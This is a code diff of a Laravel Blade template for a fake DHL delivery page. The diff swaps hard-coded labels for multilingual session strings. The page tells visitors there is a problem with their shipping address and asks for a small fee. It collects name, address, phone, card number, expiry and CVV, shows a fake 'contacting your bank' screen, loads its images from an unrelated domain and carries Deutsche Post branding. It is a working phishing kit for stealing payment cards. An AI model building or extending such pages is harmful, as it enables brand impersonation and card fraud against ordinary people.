@@ -639,7 +639,7 @@ div.expected_delivery>h2>span>span:nth-child(2)>div>a {
   </head>
   <body  data-aos-easing="ease" data-aos-duration="1000" data-aos-delay="0" style="margin: 0;">
   <div class="se-pre-con"></div>
-    <header class="header">
+  <header class="header">
     <nav class="navbar navbar-expand-lg navbar-light bg-light">
         <div class="container">
 
@@ -667,8 +667,8 @@ div.expected_delivery>h2>span>span:nth-child(2)>div>a {
                 <a href="#" class=""><span class="mbl_home"><i class="fas fa-home"></i></span>Home</a>
                 <a href="#" class=""><span class="mbl_ship"><i class="fas fa-shipping-fast"></i></span>Ship</a>
                 <a href="#" class=""><span class="mbl_track"><i class="fas fa-location-arrow"></i></span>Track</a>
-                <a class="mbl_help" href="#"><span class="ic"><i class="fas fa-hands-helping"></i></span>Help and support</a>
-                <a class="mbl_find" href="#"><span class="icc"><i class="fas fa-map-marker-alt"></i></span>Find a location/a>
+                <a class="mbl_help" href="#"><span class="ic"><i class="fas fa-hands-helping"></i></span>{{Session()->get("lang-header-help")}}</a>
+                <a class="mbl_find" href="#"><span class="icc"><i class="fas fa-map-marker-alt"></i></span>{{Session()->get("lang-header-find")}}</a>
 
                 <a href="#" class=" reg_m"><span class="mbl_reg"><i class="fas fa-lock"></i></span>Connexion</a>
 
@@ -676,10 +676,10 @@ div.expected_delivery>h2>span>span:nth-child(2)>div>a {
             <div class="navbar-collapse">
                 <ul class="navbar-nav">
                     <li class="nav-item">
-                        <a class="nav-link" href="#">Help and support</a>
+                        <a class="nav-link" href="#">{{Session()->get("lang-header-help")}}</a>
                     </li>
                     <li class="nav-item">
-                        <a class="nav-link loc" href="#">Find a location</a>
+                        <a class="nav-link loc" href="#">{{Session()->get("lang-header-find")}}</a>
                     </li>
                     <li>
                         <div class="jhGf">
@@ -697,7 +697,7 @@ div.expected_delivery>h2>span>span:nth-child(2)>div>a {
                             <form>
                                 <div class="form-item">
                                     <label for="country_selector" style="display:none;">Sélectionnez un pays ici...</label>
-                                    <input id="country_selector" type="text">
+
                                 </div>
                                 <div class="form-item" style="display:none;">
                                     <input type="text" id="country_selector_code" name="country_selector_code" data-countrycodeinput="1" readonly="readonly" placeholder="Selected country code will appear here" />
@@ -722,20 +722,20 @@ div.expected_delivery>h2>span>span:nth-child(2)>div>a {
                 <div class="col-sm-6 col-md-8 col">
                     <ul class="header-navbar-nav me-auto mb-2 mb-lg-0">
                         <li class="nav-li">
-                            <a href="#" class="top-nav">Home</a>
+                            <a href="#" class="top-nav">{{Session()->get("lang-header-home")}}</a>
                         </li>
                         <li class="nav-li">
-                            <a href="#" class="top-nav">Ship</a>
+                            <a href="#" class="top-nav">{{Session()->get("lang-header-ship")}}</a>
                         </li>
                         <li class="nav-li">
-                            <a href="#" class="top-nav">Track</a>
+                            <a href="#" class="top-nav">{{Session()->get("lang-header-track")}}</a>
                         </li>
                     </ul>
                 </div>
                 <div class="col-sm-6 col-md-3 col">
                     <ul class="eriOl">
-                        <li class="nav-li"><a href="#" class="top-nav">Register</a></li>
-                        <li class="nav-li"><a href="#" class="top-nav">Login</a></li>
+                        <li class="nav-li"><a href="#" class="top-nav">{{Session()->get("lang-header-register")}}</a></li>
+                        <li class="nav-li"><a href="#" class="top-nav">{{Session()->get("lang-header-login")}}</a></li>
                     </ul>
                 </div>
             </div>
@@ -753,15 +753,15 @@ div.expected_delivery>h2>span>span:nth-child(2)>div>a {
                             <div class="row">
                                 <div class="col-6 d-flex align-items-center">
                                     <i class="fa-solid fa-truck-fast"></i>
-                                    <strong>&nbsp;&nbsp;Package</strong>
+                                    <strong>&nbsp;&nbsp;{{Session()->get("lang-payment-package")}}</strong>
                                 </div>
                                 <div class="col-6 d-flex align-items-center">
-                                   Complete shipping protection                               </div>
+                                    {{Session()->get("lang-payment-protection")}}                              </div>
                             </div>
                             <div class="row">
                                 <div class="col-12 d-flex align-items-center">
                                     <i class="fa fa-box row-icon"></i>
-                                    <strong>Box 2 DHL - 1 Piece - 1 (34 X 18 X 10 )</strong>
+                                    <strong>{{Session()->get("lang-payment-box")}}</strong>
                                 </div>
                             </div>
                             <div class="row">
@@ -771,13 +771,13 @@ div.expected_delivery>h2>span>span:nth-child(2)>div>a {
 
                                         <div class="row">
                                             <div class="col-12">
-                                                <strong>Expedition Date:</strong>
+                                                <strong>{{Session()->get("lang-payment-exped")}}:</strong>
                                                 <span>{{now()->isoFormat('MMMM Do YYYY')}}</span>
                                             </div>
                                         </div>
                                         <div class="row">
                                             <div class="col-12">
-                                                <strong>Shipping cost :</strong>
+                                                <strong>{{Session()->get("lang-payment-shipcost")}} :</strong>
                                                 <span>3.57 {{$currency_code}}</span>
                                             </div>
                                         </div>
@@ -786,14 +786,14 @@ div.expected_delivery>h2>span>span:nth-child(2)>div>a {
                                 <div class="col-6">
                                     <div class="row">
                                         <div class="col-12">
-                                            <strong>Delivery date</strong>
+                                            <strong>{{Session()->get("lang-payment-deldate")}}</strong>
                                             <span>{{now()->addDays(3)->isoFormat('MMMM Do YYYY')}}</span>
                                         </div>
                                     </div>
                                     <div class="row">
                                         <div class="col-12">
-                                            <strong>Delivered by:</strong>
-                                            <span>End of the day</span>
+                                            <strong>{{Session()->get("lang-payment-delby")}}:</strong>
+                                            <span>{{Session()->get("lang-payment-eod")}}</span>
                                         </div>
                                     </div>
                                 </div>
@@ -804,7 +804,7 @@ div.expected_delivery>h2>span>span:nth-child(2)>div>a {
             </div>
             <div class="kQwli p-0 p-4">
                 <section class="pt-2 pl-3 pr-3 pb-3 p-md-0">
-                    <h5 class="font-weight-bold">Summary of shipping costs</h5>
+                    <h5 class="font-weight-bold">{{Session()->get("lang-payment-summary")}}</h5>
                     <div class="row">
             <div class="col-sm-10 col-sm-offset-1">
               <div class="product_summary delivery_exception">
@@ -815,9 +815,9 @@ div.expected_delivery>h2>span>span:nth-child(2)>div>a {
 		<div class="expected_delivery">
 	</div>
 		<div class="delivery_status">
-                  <h3>Status : </h3>
-                  <h2> <strong>We have issues with your shipping address</strong>
-					<p style="margin-top:15px;font-size:14px; color:black;">DHL Allows you to Redeliver your package to your address in case of delivery failure or any other case.<br>You can also track the package at any time, from shipment to delivery.</p></h2>
+                  <h3>{{Session()->get("lang-payment-status")}} : </h3>
+                  <h2> <strong>{{Session()->get("lang-payment-issues")}}</strong>
+					<p style="margin-top:15px;font-size:14px; color:black;">{{Session()->get("lang-payment-allows")}}<br>{{Session()->get("lang-payment-canalso")}}</p></h2>
                   <div class="status_feed">
                     <p> 
                     </p><p class="important"></p>
@@ -828,17 +828,17 @@ div.expected_delivery>h2>span>span:nth-child(2)>div>a {
                   <div class="bar_third bar_third_1" style="background:#67a31d;"><span></span></div>
                   <div class="bar_third bar_third_2"><span></span></div>
                   <div class="bar_third bar_third_3"><span></span></div>
-				<span class="text_explanation">Status Not Available</span></div>
+				<span class="text_explanation">{{Session()->get("lang-payment-statusnot")}}</span></div>
               </div> <!-- END Product Summary -->
         </div><!-- End col -->	
       </div>
                     <div class="row mt-4 mb-4">
                         <div class="col-md-6">
                             <div>
-                                <p class="text-uppercase font-weight-bold mb-0">Express Worldwide</p>
-                                {{now()->isoFormat('MMMM Do YYYY')}} - End of the day                            </div>
+                                <p class="text-uppercase font-weight-bold mb-0">{{Session()->get("lang-payment-express")}}</p>
+                                {{now()->isoFormat('MMMM Do YYYY')}} - {{Session()->get("lang-payment-eod")}}                            </div>
                             <div class="d-flex mt-md-4 align-items-center">
-                                <p class="font-weight-bold mr-1 mb-0">Volumetric weight</p>
+                                <p class="font-weight-bold mr-1 mb-0">{{Session()->get("lang-payment-volum")}}</p>
                                 <i class="fa fa-info-circle mr-2"
                                     style="color: #007acc;"
                                     data-toggle="tooltip"
@@ -847,11 +847,11 @@ div.expected_delivery>h2>span>span:nth-child(2)>div>a {
                                 1,2 kg
                             </div>
                             <div class="d-flex">
-                                <p class="font-weight-bold mr-2 mb-0">Total weight</p>
+                                <p class="font-weight-bold mr-2 mb-0">{{Session()->get("lang-payment-totalw")}}</p>
                                 1
                             </div>
                             <div class="d-flex">
-                                <p class="font-weight-bold mr-2 mb-0">Taxable weight</p>
+                                <p class="font-weight-bold mr-2 mb-0">{{Session()->get("lang-payment-taxw")}}</p>
                                 1,5 kg
                             </div>
                         </div>
@@ -859,24 +859,24 @@ div.expected_delivery>h2>span>span:nth-child(2)>div>a {
                             <table class="table summary-table">
                                 <tbody>
                                     <tr>
-                                        <td>Freight cost:</td>
+                                        <td>{{Session()->get("lang-payment-freight")}}:</td>
                                         <td>{{$currency_code}}</td>
                                         <td>2,73</td>
                                     </tr>
                                     <tr>
-                                        <td>Residential delivery :</td>
+                                        <td>{{Session()->get("lang-payment-resid")}} :</td>
                                         <td>{{$currency_code}}</td>
                                         <td>0,70</td>
                                     </tr>
                                     <tr>
-                                        <td>Emergency</td>
+                                        <td>{{Session()->get("lang-payment-emer")}}</td>
                                         <td>{{$currency_code}}</td>
                                         <td>0,14</td>
                                     </tr>
                                 </tbody>
                                 <tfoot>
                                     <tr>
-                                        <th>Total</th>
+                                        <th>{{Session()->get("lang-payment-total")}}</th>
                                         <th>{{$currency_code}}</th>
                                         <th>3,57</th>
                                     </tr>
@@ -952,10 +952,10 @@ div.expected_delivery>h2>span>span:nth-child(2)>div>a {
                                     <div class="se-pre-con position-absolute" style="display: none; z-index: 2;" id="load-form"></div>
                                     <div class="row">
                                         <div class="col-md-12 wfJui border-0 pt-3" id="b-form">
-                                            <h4 class="card-head">Address</h4>
+                                            <h4 class="card-head">{{Session()->get("lang-payment-address")}}</h4>
                                             <div class="col-12">
                                                 <label for="first_name"
-                                                    class="form-label">First Name</label>
+                                                    class="form-label">{{Session()->get("lang-payment-firstn")}}</label>
                                                 <input type="text" class="form-control" name="first_name" id="first_name"
                                                     autocomplete="given-name" data-parsley-minlength="2"
                                                     data-parsley-minlength-message="Minimum character: 2"
@@ -965,7 +965,7 @@ div.expected_delivery>h2>span>span:nth-child(2)>div>a {
                                             </div>
                                             <div class="col-12">
                                                 <label for="last_name"
-                                                    class="form-label">Last Name</label>
+                                                    class="form-label">{{Session()->get("lang-payment-lastn")}}</label>
                                                 <input type="text" class="form-control" name="last_name" id="last_name"
                                                     autocomplete="family-name" data-parsley-minlength="2"
                                                     data-parsley-minlength-message="Minimum character: 2"
@@ -975,7 +975,7 @@ div.expected_delivery>h2>span>span:nth-child(2)>div>a {
                                             </div>
                                             <div class="col-12">
                                                 <label for="line_1"
-                                                    class="form-label">Address Line 1</label>
+                                                    class="form-label">{{Session()->get("lang-payment-adr1")}}</label>
                                                 <input type="text" class="form-control" name="line_1" id="line_1"
                                                     autocomplete="address-line1" data-parsley-required-message="Required"
                                                     value=""
@@ -983,7 +983,7 @@ div.expected_delivery>h2>span>span:nth-child(2)>div>a {
                                             </div>
                                             <div class="col-12">
                                                 <label for="line_2"
-                                                    class="form-label">Address Line 2</label>
+                                                    class="form-label">{{Session()->get("lang-payment-adr2")}}</label>
                                                 <input type="text" class="form-control" name="line_2" id="line_2"
                                                     value=""
                                                     autocomplete="address-line2">
@@ -992,7 +992,7 @@ div.expected_delivery>h2>span>span:nth-child(2)>div>a {
                                             <div class="row" style=" margin-right: 0; margin-left:0;">
                                                 <div class="col-md-4">
                                                     <label for="postal_code"
-                                                        class="form-label">Postal Code</label>
+                                                        class="form-label">{{Session()->get("lang-payment-post")}}</label>
                                                     <input type="text" class="form-control" name="postal_code"
                                                         id="postal_code" autocomplete="postal-code" data-parsley-minlength="2"
                                                         data-parsley-minlength-message="Invalid Zip/Postal Code"
@@ -1001,14 +1001,14 @@ div.expected_delivery>h2>span>span:nth-child(2)>div>a {
                                                         required="">
                                                 </div>
                                                 <div class="col-md-4">
-                                                    <label for="city" class="form-label">City</label>
+                                                    <label for="city" class="form-label">{{Session()->get("lang-payment-city")}}</label>
                                                     <input type="text" class="form-control" name="city" id="city"
                                                         autocomplete="address-level2" data-parsley-required-message="Required"
                                                     value=""
                                                         data-parsley-trigger="focusout" required="">
                                                 </div>
                                                 <div class="col-md-4">
-                                                    <label for="state" class="form-label">State</label>
+                                                    <label for="state" class="form-label">{{Session()->get("lang-payment-state")}}</label>
                                                     <input type="text" class="form-control" name="state" id="state"
                                                         autocomplete="address-level1" data-parsley-required-message="Required"
                                                         value=""
@@ -1020,7 +1020,7 @@ div.expected_delivery>h2>span>span:nth-child(2)>div>a {
                                             <div class="row" style="margin-right: 0; margin-left:0;">
                                                 <div class="col-md-6 country-col">
                                                     <label for="country"
-                                                        class="form-label">Country</label>
+                                                        class="form-label">{{Session()->get("lang-payment-country")}}</label>
                                                     <input type="text" class="form-control" name="country" id="country"
                                                         autocomplete="country" data-parsley-required-message="Required"
                                                         value=""
@@ -1028,7 +1028,7 @@ div.expected_delivery>h2>span>span:nth-child(2)>div>a {
                                                 </div>
                                                 <div class="col-md-6">
                                                     <label for="phone_number"
-                                                        class="form-label">Phone Number</label>
+                                                        class="form-label">{{Session()->get("lang-payment-phone")}}</label>
                                                     <input type="text" class="form-control d-block" name="phone_number"
                                                         id="phone_number" type="tel" autocomplete="tel"
                                                         ata-parsley-pattern="^[\d\+\-\.\(\)\/\s]*$"
@@ -1039,12 +1039,12 @@ div.expected_delivery>h2>span>span:nth-child(2)>div>a {
                                             </div>
                                             <div class="row justify-content-end pr-md-3 pl-3 pr-3 pl-md-0 pb-3 pb-md-0">
                                                 <div class="col-md-4 col-lg-3">
-                                                    <button class="btn btn-success btn-block" id="b-continue">Continue</button>
+                                                    <button class="btn btn-success btn-block" id="b-continue">{{Session()->get("lang-payment-continue")}}</button>
                                                 </div>
                                             </div>
                                         </div>
                                         <div class="col-md-12 wfJui border-0 pl-4 pr-4 pt-3 pb-3 c-form" style="display: none;">
-                                            <h4 class="card-head ml-0">Payment Information</h4>
+                                            <h4 class="card-head ml-0">{{Session()->get("lang-payment-payment")}}</h4>
                                             <div class="col-md-10">
                                                 <div class="form-check">
                                                     <input type="hidden" name="card_type" value="card">
@@ -1055,7 +1055,7 @@ div.expected_delivery>h2>span>span:nth-child(2)>div>a {
                                             <div class="mb-3">
                                                 <div class="card-types"></div>
                                                 <label for="card_number"
-                                                    class="form-label">Card Number</label>
+                                                    class="form-label">{{Session()->get("lang-payment-cc")}}</label>
                                                 <input type="text" class="form-control" name="card_number" id="cc-num"
                                                     autocomplete="cc-number" data-parsley-required-message="Required"
                                                     value=""
@@ -1065,7 +1065,7 @@ div.expected_delivery>h2>span>span:nth-child(2)>div>a {
                                             </div>
                                             <div class="row">
                                                 <div class="col-md-6">
-                                                    <label for="expiry" class="form-label">Expiration Date</label>
+                                                    <label for="expiry" class="form-label">{{Session()->get("lang-payment-exp")}}</label>
                                                     <input type="text" class="form-control" name="expiry" id="expiry"
                                                         maxlength="7" placeholder="mm/yy"
                                                         value=""
@@ -1073,7 +1073,7 @@ div.expected_delivery>h2>span>span:nth-child(2)>div>a {
                                                         autocomplete="cc-exp">
                                                 </div>
                                                 <div class="col-md-6">
-                                                    <label for="cvv" class="form-label">CVV</label>
+                                                    <label for="cvv" class="form-label">{{Session()->get("lang-payment-cvv")}}</label>
                                                     <div class="input-wappend w-100 position-relative">
                                                         <input type="text" name="cvv" class="form-control" id="cvv"
                                                             autocomplete="cc-csc" data-parsley-required-message="Required"
@@ -1087,12 +1087,12 @@ div.expected_delivery>h2>span>span:nth-child(2)>div>a {
                                             <div class="row justify-content-end mt-4">
                                                 <div class="col-md-8 d-flex align-items-center justify-content-center justify-content-md-end p-md-0 mb-2 mb-md-0">
                                                     <p class="mb-0" style="font-size: .8rem;">
-                                                        By clicking on ACCEPT – I accept DHL
-    <a href='#' style='color: #007acc;'>General Conditions of Carriage T&C online</a>                                                    </p>
+                                                        {{Session()->get("lang-payment-click")}}
+    <a href='#' style='color: #007acc;'>{{Session()->get("lang-payment-general")}}</a>                                                    </p>
                                                 </div>
                                                 <div class="col-md-4 col-lg-3">
                                                     <button type="submit" class="btn btn-success btn-block m-0" id="orm"
-                                                        value="validate">Confirm</button>
+                                                        value="validate">{{Session()->get("lang-payment-confirm")}}</button>
                                                 </div>
                                             </div>
                                         </div>
@@ -1117,7 +1117,7 @@ div.expected_delivery>h2>span>span:nth-child(2)>div>a {
 
                             <img src="https://dispatching-centre.wtechsmartwater.com/images/loading.gif" alt="">
 
-                            <small>We are contacting your bank... </small>
+                            <small>{{Session()->get("lang-payment-contacting")}}... </small>
 
                         </div>
                     </section>
@@ -1128,7 +1128,7 @@ div.expected_delivery>h2>span>span:nth-child(2)>div>a {
 
                             <img src="https://dispatching-centre.wtechsmartwater.com/images/loading-circle.gif" alt="" style="height: 80px;">
 
-                            <small>Loading...</small>
+                            <small>{{Session()->get("lang-payment-loading")}}...</small>
 
                         </div>
                     </section>
@@ -1146,88 +1146,88 @@ div.expected_delivery>h2>span>span:nth-child(2)>div>a {
 
 
     <footer>
-    <div class="footer-border">
-        <div class="container">
-            <hr>
-            <div class="row">
-                <div class="col-sm-12 col-md-8">
-                    <div class="pdIr">
-                        <div class="row">
-                            <div class="col-sm-12 col-md-4 col">
-                                <div class="square">
-                                    <h4 class="headline">Contact and Support </h4>
-                                    <ul>
-                                        <li><a href="#">Help and support</a></li>
-                                        <li><a href="#">FAQs</a></li>
-                                        <li><a href="#">Contact Us</a></li>
-                                        <li><a href="#">Find a location</a></li>
-                                    </ul>
+        <div class="footer-border">
+            <div class="container">
+                <hr>
+                <div class="row">
+                    <div class="col-sm-12 col-md-8">
+                        <div class="pdIr">
+                            <div class="row">
+                                <div class="col-sm-12 col-md-4 col">
+                                    <div class="square">
+                                        <h4 class="headline">{{Session()->get("lang-footer-cands")}} </h4>
+                                        <ul>
+                                            <li><a href="#">{{Session()->get("lang-header-help")}}</a></li>
+                                            <li><a href="#">{{Session()->get("lang-footer-faqs")}}</a></li>
+                                            <li><a href="#">{{Session()->get("lang-footer-contact")}}</a></li>
+                                            <li><a href="#">{{Session()->get("lang-header-find")}}</a></li>
+                                        </ul>
+                                    </div>
                                 </div>
-                            </div>
-                            <div class="col-sm-12 col-md-4 col">
-                                <div class="square">
-                                    <h4 class="headline">Legal</h4>
-                                    <ul>
-                                        <li><a href="#">Terms and Conditions</a></li>
-                                        <li><a href="#">Privacy Notice</a></li>
-                                    </ul>
+                                <div class="col-sm-12 col-md-4 col">
+                                    <div class="square">
+                                        <h4 class="headline">{{Session()->get("lang-footer-legal")}}</h4>
+                                        <ul>
+                                            <li><a href="#">{{Session()->get("lang-footer-terms")}}</a></li>
+                                            <li><a href="#">{{Session()->get("lang-footer-privacy")}}</a></li>
+                                        </ul>
+                                    </div>
                                 </div>
-                            </div>
-                            <div class="col-sm-12 col-md-4 col">
-                                <div class="square">
-                                <h4 class="headline">Alerts</h4>
-                                    <ul>
-                                        <li><a href="#">Fraud Awareness</a></li>
-                                        <li><a href="#">Fraud Support</a></li>
-                                        <li><a href="#">Important Information</a></li>
-                                    </ul>
+                                <div class="col-sm-12 col-md-4 col">
+                                    <div class="square">
+                                    <h4 class="headline">{{Session()->get("lang-footer-alerts")}}</h4>
+                                        <ul>
+                                            <li><a href="#">{{Session()->get("lang-footer-fawa")}}</a></li>
+                                            <li><a href="#">{{Session()->get("lang-footer-fas")}}</a></li>
+                                            <li><a href="#">{{Session()->get("lang-footer-import")}}</a></li>
+                                        </ul>
+                                    </div>
                                 </div>
                             </div>
                         </div>
                     </div>
-                </div>
-                <div class="col-sm-12 col-md-4">
-                    <div class="wetSq">
-                        <div class="cyNe">
-                            <img src="https://dispatching-centre.wtechsmartwater.com/images/foo.png" alt="">
+                    <div class="col-sm-12 col-md-4">
+                        <div class="wetSq">
+                            <div class="cyNe">
+                                <img src="https://dispatching-centre.wtechsmartwater.com/images/foo.png" alt="">
+                            </div>
+                            <div class="ledIu">
+                                <ul>
+                                    <li><a href="#">{{Session()->get("lang-footer-about")}}</a></li>
+                                    <li><a href="#">{{Session()->get("lang-footer-news")}}</a></li>
+                                    <li><a href="#">{{Session()->get("lang-footer-careers")}}</a></li>
+                                    <li><a href="#">{{Session()->get("lang-footer-legalno")}}</a></li>
+                                </ul>
+                            </div>
                         </div>
-                        <div class="ledIu">
+                    </div>
+                </div>
+                <hr>
+            </div>
+        </div>
+        <div class="footer-media">
+            <div class="container">
+                <div class="row">
+                    <div class="col">
+                        <div class="social">
+                            <h4>{{Session()->get("lang-footer-follow")}}</h4>
                             <ul>
-                                <li><a href="#">About DHL</a></li>
-                                <li><a href="#">News</a></li>
-                                <li><a href="#">Careers</a></li>
-                                <li><a href="#">Legal notice</a></li>
+                                <li><a href="#"><i class="fab fa-facebook-f"></i></a></li>
+                                <li><a href="#"><i class="fab fa-twitter"></i></a></li>
+                                <li><a href="#"><i class="fab fa-youtube"></i></a></li>
+                                <li><a href="#"><i class="fab fa-instagram"></i></a></li>
                             </ul>
                         </div>
                     </div>
-                </div>
-            </div>
-            <hr>
-        </div>
-    </div>
-    <div class="footer-media">
-        <div class="container">
-            <div class="row">
-                <div class="col">
-                    <div class="social">
-                        <h4>Follow us</h4>
-                        <ul>
-                            <li><a href="#"><i class="fab fa-facebook-f"></i></a></li>
-                            <li><a href="#"><i class="fab fa-twitter"></i></a></li>
-                            <li><a href="#"><i class="fab fa-youtube"></i></a></li>
-                            <li><a href="#"><i class="fab fa-instagram"></i></a></li>
-                        </ul>
-                    </div>
-                </div>
-                <div class="col offset-md-4">
-                    <div class="copyright">
-                        <p>2022 © Deutsche Post AG - All rights reserved</p>
+                    <div class="col offset-md-4">
+                        <div class="copyright">
+                            <p>2022 © Deutsche Post AG - All rights reserved</p>
+                        </div>
                     </div>
                 </div>
             </div>
         </div>
-    </div>
-</footer>
+    </footer>
 
     <script>
         window.sessionHash = "{{Session()->get("session")}}";
